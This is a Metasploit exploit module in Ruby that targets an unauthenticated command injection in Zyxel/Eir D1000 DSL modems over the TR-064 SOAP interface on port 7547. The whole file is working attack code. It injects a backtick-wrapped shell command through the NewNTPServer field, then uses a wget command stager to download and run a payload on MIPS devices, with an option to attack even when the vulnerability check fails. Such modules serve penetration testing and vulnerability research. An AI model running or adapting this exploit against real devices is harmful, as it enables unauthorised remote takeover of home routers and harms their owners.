
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064&#039;,
      &#039;Description&#039; => %q{
        Broadband DSL modems manufactured by Zyxel and distributed by some
        European ISPs are vulnerable to a command injection vulnerability when setting
        the &#039;NewNTPServer&#039; value using the TR-64 SOAP-based configuration protocol. In
        the tested case, no authentication is required to set this value on affected
        DSL modems.

        This exploit was originally tested on firmware versions up to 2.00(AADU.5)_20150909.
      },
      &#039;Author&#039;      =>
        [
          &#039;Kenzo&#039;, # Vulnerability discovery and original Metasploit module
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039;, # Copypasta from TheMoon msf module, payload help
          &#039;todb&#039;,  # Metasploit module
          &#039;wvu&#039; ,  # Metasploit module
          &#039;0x27&#039;   # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;EDB&#039;, &#039;40740&#039; ],
          [ &#039;URL&#039;, &#039;https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759&#039;],
          [ &#039;URL&#039;, &#039;https://broadband-forum.org/technical/download/TR-064.pdf&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 07 2016&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039; =>
        [
          [ &#039;MIPS Big Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSBE
            }
          ],
          [ &#039;MIPS Little Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSLE
            }
          ],

        ],
      &#039;DefaultTarget&#039;    => 0,
      &#039;DefaultOptions&#039; => {&#039;WfsDelay&#039; => 10}
      ))

    register_options(
      [
        Opt::RPORT(7547), # TR-064 CWMP port for SOAP/XML commands
        OptBool::new(&#039;FORCE_EXPLOIT&#039;, [false, &#039;Force an attempt even if the check fails&#039;, nil])
      ], self.class)

  end

  def set_new_ntp_server(cmd)
    template = "<?xml version=\"1.0\"?>"
    template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    template << " <SOAP-ENV:Body>"
    template << "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
    template << "   <NewNTPServer1>`%s`</NewNTPServer1>" # Backticks, aw yeah
    template << "   <NewNTPServer2></NewNTPServer2>"
    template << "   <NewNTPServer3></NewNTPServer3>"
    template << "   <NewNTPServer4></NewNTPServer4>"
    template << "   <NewNTPServer5></NewNTPServer5>"
    template << "  </u:SetNTPServers>"
    template << " </SOAP-ENV:Body>"
    template << "</SOAP-ENV:Envelope>"

    template % cmd
  end

  def execute_command(cmd, opts)
    uri = &#039;/UD/act?1&#039;
    soapaction = "urn:dslforum-org:service:Time:1#SetNTPServers"
    injected_data = set_new_ntp_server(cmd)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;ctype&#039; => "text/xml",
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soapaction,
          },
        &#039;data&#039; => injected_data
      }, 2)
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/globe&#039; # TODO: Check this? Why not /UD/act?1
      })
    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - A connection error has occured")
      return Exploit::CheckCode::Unknown
    end

    if res and res.code == 404 and res.body =~ /home_wan\.htm/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def inject_staged_data
    execute_cmdstager(flavor: :wget, linemax: 65, delay: 3)
  end

  def exploit
    print_status("#{peer} - Checking...")

    if check == Exploit::CheckCode::Appears
      print_status("#{peer} - Appears vulnerable")
      inject_staged_data
    elsif datastore[&#039;FORCE_EXPLOIT&#039;]
      print_status("#{peer} - Doesn&#039;t appear vulnerable, but trying anyway.")
      inject_staged_data
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to access the device")
    end

  end

end

